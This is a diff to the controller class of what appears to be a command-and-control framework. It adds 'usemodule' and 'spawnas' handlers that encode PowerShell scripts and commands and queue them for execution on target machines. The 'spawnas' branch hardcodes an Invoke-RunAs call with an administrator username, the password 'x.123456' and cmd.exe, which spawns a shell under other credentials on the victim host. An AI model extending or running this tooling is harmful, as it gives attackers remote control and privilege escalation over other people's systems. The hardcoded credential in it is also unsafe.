@@ -205,6 +205,39 @@ class Control():
             _exec = ("%s|%s|%s|%s") % ("powershell-encoded" , utimestamp, encoded, encoded_import)
             gdata.target[param_target]["exec"] = _exec
         
+        # USEMODULE: IMPORT & COMMAND [JOB]
+        elif param.startswith("usemodule"):
+            m_script = param.split(" ")[1]
+            m_command = param.replace("usemodule ","")
+            m_command = m_command.replace(m_script+" ","")
+            with open(m_script) as f:
+                encoded_import = powershell_encoder(f.read())
+            utimestamp = int(time.time())
+            encoded = powershell_encoder(m_command)
+            _exec = ("%s|%s|%s|%s") % ("usemodule" , utimestamp, encoded, encoded_import)
+            gdata.target[param_target]["exec"] = _exec
+        
+        # USEMODULE: IMPORT & COMMAND [JOB]
+        elif param.startswith("spawnas"):
+            '''
+            m_script = param.split(" ")[1]
+            m_command = param.replace("usemodule ","")
+            m_command = m_command.replace(m_script+" ","")
+            '''
+            m_script = "modules/core/Invoke-Runas.ps1"
+            
+            m_command = "\nInvoke-RunAs "
+            m_command += "-username \"%s\" " % ("administrator")
+            m_command += "-password \"%s\" " % ("x.123456")
+            m_command += "-Cmd %s " % ("cmd.exe")
+            
+            with open(m_script) as f:
+                encoded_import = powershell_encoder(f.read())
+            utimestamp = int(time.time())
+            encoded = powershell_encoder(m_command)
+            _exec = ("%s|%s|%s|%s") % ("usemodule" , utimestamp, encoded, encoded_import)
+            gdata.target[param_target]["exec"] = _exec
+        
         # EXEC COMMAND ON THE TARGET
         else:
             #print "%sCOMMAND:%s %s" % (bcolors.BOLD, bcolors.ENDC, param)
